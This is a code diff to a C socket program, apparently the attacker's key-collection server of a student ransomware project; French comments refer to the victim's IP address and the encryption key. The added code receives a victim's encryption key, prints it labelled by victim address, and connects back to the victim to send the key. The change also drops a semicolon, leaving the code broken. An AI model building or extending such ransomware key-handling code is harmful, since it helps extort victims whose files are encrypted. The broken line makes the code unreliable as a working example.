@@ -16,8 +16,7 @@ void handle_error(){
 int main(void){
     int sockid;
     int server_port = 8888;
-    char *server_ip = "127.0.0.1";
-
+    char *server_ip = "127.0.0.1"
     sockid = socket(AF_INET, SOCK_STREAM, 0);
 
     struct sockaddr_in server_addr, client_addr;
@@ -48,14 +47,30 @@ int main(void){
         }
         printf("Accept connection from %s\n", inet_ntoa(client_addr.sin_addr)); //affichage de l'adresse ip de la victime
         n = recv(client_socket, (char *) buffer, BUFFER_SIZE, MSG_WAITALL);
-
-        printf("key = %s\n",(char *)buffer);
         //reception et affichage de la clé de chiffrage
 
     }
     char *new_ip = inet_ntoa(client_addr.sin_addr);
-    printf("%s", new_ip);
+    char *key = (char *)buffer;
     close(sockid);
     
+    printf("key for the victim @ : %s  : %s", new_ip, key);
+    
+    int sockid2;
+    server_ip = new_ip;
+
+    sockid2 = socket(AF_INET, SOCK_STREAM,0);
+
+    struct sockaddr_in server_addr2;
+    server_addr2.sin_family = AF_INET;
+    server_addr2.sin_port = htons(server_port);
+    server_addr2.sin_addr.s_addr = inet_addr(new_ip);
+
+    char *msg = key;
+
+    connect(sockid2,(struct sockaddr *)&server_addr2,sizeof(server_addr2));
+
+    send(sockid2,(const char *)msg,strlen(msg),0);
+    close(sockid2);
     
 }
